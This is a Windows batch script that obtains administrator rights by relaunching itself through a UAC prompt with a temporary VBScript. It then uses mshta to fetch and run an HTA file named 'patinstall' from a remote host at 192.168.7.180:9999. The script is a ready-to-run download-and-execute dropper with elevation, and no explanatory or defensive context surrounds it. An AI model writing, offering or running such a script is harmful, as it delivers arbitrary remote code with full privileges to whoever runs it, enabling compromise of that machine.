@echo off
:: Check for administrator privileges
net session >nul 2>&1
if %errorlevel% == 0 (
    echo Success: Administrative privileges confirmed.
) else (
    echo Requesting administrative privileges...
    goto UACPrompt
)
goto Execute

:UACPrompt
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
echo UAC.ShellExecute "%~0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
"%temp%\getadmin.vbs"
del "%temp%\getadmin.vbs"
exit /B

:Execute
:: Your command goes here
mshta http://192.168.7.180:9999/patinstall

pause
